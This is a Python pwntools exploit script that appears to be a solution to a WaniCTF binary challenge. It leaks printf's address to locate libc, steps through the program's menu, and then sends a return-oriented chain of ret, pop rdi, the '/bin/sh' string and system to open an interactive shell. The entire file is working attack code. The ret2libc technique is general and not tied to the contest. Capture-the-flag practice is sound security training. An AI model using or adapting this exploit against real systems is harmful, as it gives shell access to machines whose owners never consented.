from pwn import *
libc = ELF("./libc.so.6")
# io = remote("chal-lz56g6.wanictf.org", 9005)
io = ELF("./chall").start()

io.recvuntil(b"printf = ")
leak_printf = int(io.recvline(), 16)
log.success(hex(leak_printf))
libc.address = leak_printf - libc.symbols['printf']
log.success(f'libc_base = {hex(libc.address)}')

io.sendlineafter(b": ", b'A')
for i in range(0, 2):
    io.sendlineafter(b": ", b'1')
io.sendlineafter(b": ", b'B')
for i in range(0, 2):
    io.sendlineafter(b": ", b'1')
io.sendlineafter(b": ", b'C')
for i in range(0, 2):
    io.sendlineafter(b": ", b'1')

POP_RDI_RET = p64(libc.address + 0x000000000010f75b)
RET = p64(libc.address + 0x000000000002882f)
SYSTEM = p64(libc.symbols['system'])
BIN_SH = p64(next(libc.search(b'/bin/sh')))

log.info(f'POP_RDI_RET = {hex(u64(POP_RDI_RET))}')
log.info(f'RET = {hex(u64(RET))}')
log.info(f'SYSTEM = {hex(u64(SYSTEM))}')
log.info(f'BIN_SH = {hex(u64(BIN_SH))}')

p = RET + POP_RDI_RET + BIN_SH + SYSTEM
io.sendlineafter(b": ", p)
io.sendlineafter(b": ", b'\xde\xad\xbe\xef') # %lf doesnt read bytes

io.interactive()